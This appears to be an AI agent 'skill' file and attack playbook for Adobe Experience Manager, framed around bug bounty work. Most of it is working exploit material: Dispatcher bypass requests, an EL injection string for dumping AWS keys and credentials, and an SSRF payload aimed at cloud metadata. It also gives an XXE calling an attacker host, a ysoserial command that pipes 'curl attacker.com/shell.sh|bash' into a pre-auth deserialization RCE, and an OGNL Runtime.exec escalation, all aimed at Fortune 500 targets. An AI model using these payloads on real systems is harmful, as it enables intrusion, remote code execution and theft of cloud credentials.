---
name: aem-attack
description: "Adobe Experience Manager attack surface — Dispatcher filter bypass, JCR/QueryBuilder node access, GetDocumentServlet pre-auth deserialization RCE on AEM Forms, EL injection, and .rum proxy XSS on AEM Cloud Service. Use when fingerprinting shows AEM (/etc.clientlibs, /content/dam, /crx/de, /system/console, CQ-* headers) — extremely common on Fortune 500 targets."
---

# Adobe Experience Manager (AEM) Attack Surface

## Crown Jewel Targets

- Fortune 500 AEM instances (extremely common in enterprise)
- AEM Cloud Service with `.rum` proxy (XSS via WHATWG URL parsing)
- AEM Forms on JBoss standalone (`GetDocumentServlet` pre-auth deser RCE)
- AEM Dispatcher with `nocanon` ProxyPass configuration
- AEM with exposed QueryBuilder (`/bin/querybuilder.json`)
- AEM CRX Package Manager (`/crx/packmgr/`) for XXE
- AEM with OSGi bundle EL injection (credential/secret extraction)

## Attack Surface Signals

- HTML source: `cq-`, `aem`, `jcr:`, `sling`, `clientlib` references
- URL paths: `/content/dam/`, `/crx/de/`, `/system/console/`, `/bin/querybuilder.json`
- AEM Forms: `/lc/libs/livecycle/core/content/login.html`
- Headers: `X-Powered-By: AEM`, Dispatcher cache headers
- Error pages: Apache Sling error format

**Source:** SLCyber (2025-2026), Assetnote
**CVEs:** CVE-2025-54246, CVE-2025-54247, CVE-2025-54248, CVE-2025-54249, CVE-2025-54250, CVE-2025-54251, CVE-2025-54252, CVE-2025-49533, CVE-2025-54254, CVE-2025-54253, CVE-2025-47114, CVE-2025-47115
**Affected:** Adobe Experience Manager (Cloud Service, 6.5.x), AEM Forms (J2EE/JBoss standalone)

## Overview

AEM is one of the most deployed enterprise CMS platforms across Fortune 500 companies. Its architecture combines Apache Sling (resource-based routing), Apache Jackrabbit (JCR content repository), and OSGi (plugin framework). The Dispatcher (Apache/IIS reverse proxy) is the primary security boundary, but numerous bypass techniques exist due to parsing differentials between Dispatcher and Sling. AEM Forms standalone on JBoss adds classic Java EE attack surface.

## Technical Details

### AEM Dispatcher Bypass Techniques

The Dispatcher filters requests based on URL patterns. Sling resolves resources differently, creating parsing differentials.

**`nocanon` + Path Traversal:**
When `ProxyPass / ajp://... nocanon` is configured, encoded path segments pass through to AEM unprocessed:
```
GET /graphql/execute.json/..%2f../bin/querybuilder.json HTTP/1.1
```
Dispatcher sees `/graphql/execute.json/...` (allowed), Sling resolves `../bin/querybuilder.json` (restricted).

**Semicolon Parsing Differential:**
Sling treats semicolons as path parameter delimiters. Dispatcher sees the full string as a filename:
```
GET /bin/querybuilder.json;x='a/b.css/c' HTTP/1.1
```
Dispatcher matches `.css` extension (allowed static file). Sling strips the semicolon suffix, resolving `/bin/querybuilder.json`.

**Additional Dispatcher Bypass Patterns:**
```
/content/dam.json                          # Direct JCR access
/content/dam.infinity.json                 # Full subtree dump
/content.query.json?statement=*&querytype=xpath  # XPath query
/bin/querybuilder.json?type=nt:file&nodename=*   # QueryBuilder
```

### Pre-Auth Resource Node Creation

`BulkImportConfigServlet` at `/cloudsettings.bulkimportConfig.json` allows creating JCR nodes without authentication. POST with `path=/content/evil&source=s3://bucket&recursive=true` creates persistent configuration nodes for further exploitation.

### Expression Language Injection (Mass Config Dump)

EL injection through OSGi bundle context exposes all service configurations including secrets:
```
${pageContext.class.classLoader.bundle.bundleContext.bundles[N].registeredServices[M].properties}
```
Iterate `N` (bundle index) and `M` (service index) to extract:
- AWS access keys and secret keys
- Azure connection strings
- LDAP bind credentials
- Admin password hashes
- JWT signing certificates and private keys

### Full-Read SSRF

The `/services/accesstoken/verify` endpoint follows user-supplied `auth_url` parameter:
```
POST /services/accesstoken/verify HTTP/1.1
Content-Type: application/json

{"token":"x","auth_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
Full response returned to attacker. Cloud metadata, internal services, admin panels all reachable.

### Blind XXE via Package Manager

The CRX Package Manager accepts XML in package definitions:
```
POST /crx/packmgr/service/exec.json HTTP/1.1
Content-Type: multipart/form-data

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<package><name>&xxe;</name></package>
```

### AEM Forms Standalone (J2EE/JBoss)

**Java Deserialization RCE via `GetDocumentServlet`:**
```
GET /FormServer/servlet/GetDocumentServlet?serDoc=BASE64_GZIP_PAYLOAD HTTP/1.1
```
The `serDoc` parameter accepts base64+gzip-encoded serialized Java objects. Generate payload:
```bash
java -jar ysoserial.jar CommonsBeanutils1 'curl attacker.com/shell.sh|bash' | gzip | base64 -w0
```
Pre-auth, no authentication required. Full RCE as the JBoss service account.

**XXE in SOAP Services:**
All `/edcws/services/*` endpoints accept XML with entity declarations in the `<EDCSecurity>` SOAP header, which is parsed before authentication:
```xml
<soapenv:Header>
  <EDCSecurity xmlns="...">
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <Credentials userId="&xxe;" password="x"/>
  </EDCSecurity>
</soapenv:Header>
```

**Auth Bypass + Struts devMode OGNL:**
Append `;login.` suffix to bypass authentication filters. Combined with Struts devMode enabled:
```
GET /lc/content/admin.html;login.?debug=command&expression=7*7 HTTP/1.1
```
OGNL expression evaluates server-side. Escalate to RCE:
```
debug=command&expression=%23rt=@java.lang.Runtime@getRuntime(),@rt.exec('id')
```

### AEM Cloud XSS via `.rum` Proxy

The Real User Monitoring (`.rum`) proxy on AEM Cloud Service is vulnerable to WHATWG URL parsing differentials. Tab characters (`\t`, `\n`) in URLs are stripped by WHATWG parsers but not by server-side validation:
```
https://target.com/.rum/@java\tscript:alert(1)
```
Combined with NPM package squatting on the RUM analytics package for persistent XSS injection.

## Detection Indicators

```bash
# AEM fingerprinting
curl -s https://target/ | grep -i "cq-\|aem\|jcr:\|sling\|clientlib"
for path in /content/dam/.json /crx/de/index.jsp /system/console /bin/querybuilder.json; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' https://target$path)"
done

# AEM Forms detection
curl -s https://target/lc/libs/livecycle/core/content/login.html -o /dev/null -w "%{http_code}"

# Key AEM paths: /content/dam/, /crx/de/, /crx/explorer/, /etc/clientlibs/,
# /system/console/, /bin/querybuilder.json, /libs/granite/core/content/login.html
```

## Testing Methodology

1. **Fingerprint AEM version:** Check `/libs/cq/core/content/welcome.html`, error pages, `X-Powered-By` headers
2. **Test Dispatcher bypass:** Try all semicolon and encoding variants against restricted paths
3. **Enumerate accessible servlets:** `/bin/querybuilder.json`, `/crx/packmgr/`, `/system/console/`
4. **Test EL injection:** Iterate bundle/service indices for configuration extraction
5. **SSRF via accesstoken verify:** Target cloud metadata endpoints (169.254.169.254, 169.254.170.2)
6. **AEM Forms check:** `/lc/libs/livecycle/core/content/login.html` accessible? Test `GetDocumentServlet`
7. **Use hopgoblin tool:** `hopgoblin -target https://target.com` (github.com/assetnote/hopgoblin)

## Bug Bounty Relevance

- **CRITICAL**: AEM is extremely common in enterprise (Fortune 500). Many attack paths are pre-auth
- **CRITICAL**: Dispatcher bypass → QueryBuilder/JCR access → full content repository dump
- **CRITICAL**: AEM Forms deserialization → pre-auth RCE on JBoss
- **HIGH**: EL injection → mass config dump (AWS keys, admin hashes, signing certs)
- **HIGH**: SSRF via accesstoken verify → cloud metadata extraction
- AEM instances are almost always in scope for enterprise bug bounty programs
- Dispatcher bypass patterns are frequently misconfigured even on patched installations

## Operator Notes (Battle-Tested)

- **Semicolon parsing differential is the universal bypass**: Sling treats `;` as path parameter delimiter. Dispatcher sees full string as filename. `/bin/querybuilder.json;x='a/b.css/c'` bypasses Dispatcher and reaches QueryBuilder.
- **`nocanon` + path traversal**: When `ProxyPass / ajp://... nocanon` is configured, encoded path segments pass unprocessed to AEM. `/graphql/execute.json/..%2f../bin/querybuilder.json` bypasses Dispatcher.
- **AEM Forms deser is pre-auth RCE**: `GetDocumentServlet?serDoc=BASE64_GZIP_PAYLOAD` — no auth required. Use `ysoserial CommonsBeanutils1` gadget. This is the highest-severity AEM finding.
- **EL injection dumps ALL secrets**: Iterate bundle/service indices to extract AWS keys, LDAP creds, admin hashes, JWT signing certs from OSGi configs.
- **SSRF via `/services/accesstoken/verify`**: Full-response SSRF to cloud metadata (`169.254.169.254`). Extract IAM credentials for cloud pivot.
- **Use hopgoblin**: `hopgoblin -target https://target.com` automates Dispatcher bypass detection. Run it first on every AEM target.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `server-confusion-attacks` → `references/tomcat-path-normalization-bypass.md` | Path confusion on AEM's Tomcat/Sling |
| `deserialization-testing` → `references/java-deserialization-rce.md` | AEM Forms ysoserial chains |
| `ssrf-testing` | SSRF via accesstoken verify |
| `server-confusion-attacks` | Dispatcher bypass methodology |
| `spring-el-injection` | EL injection on AEM OSGi bundles |
